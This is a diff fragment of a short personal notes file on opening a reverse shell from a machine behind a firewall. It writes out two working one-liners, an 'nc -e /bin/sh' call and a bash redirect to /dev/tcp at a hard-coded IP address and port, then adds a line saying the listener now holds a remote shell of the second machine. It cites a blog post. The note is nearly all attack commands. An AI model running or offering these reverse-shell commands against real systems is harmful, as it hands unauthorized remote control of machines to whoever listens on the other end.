@@ -3,4 +3,6 @@
 2) host2, machine behind firewall
    a) $ nc host1:4040 -e /bin/sh  OR
    b) $ /bin/bash -i > /dev/tcp/120.76.228.32/4040 0<&1 2>&1
+3) now got a remote shell of host2 on machine host1 by nc
+
 refer: https://www.cnblogs.com/tdcqma/p/5184004.html
